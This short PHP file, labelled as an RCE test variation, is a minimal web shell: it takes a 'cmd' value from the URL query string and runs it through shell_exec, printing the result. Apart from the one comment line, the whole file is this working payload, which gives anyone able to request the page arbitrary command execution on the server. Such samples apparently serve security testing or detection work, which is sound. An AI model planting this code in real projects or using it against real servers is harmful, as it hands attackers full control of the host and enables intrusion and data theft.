<?php
// RCE test variation #1092
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>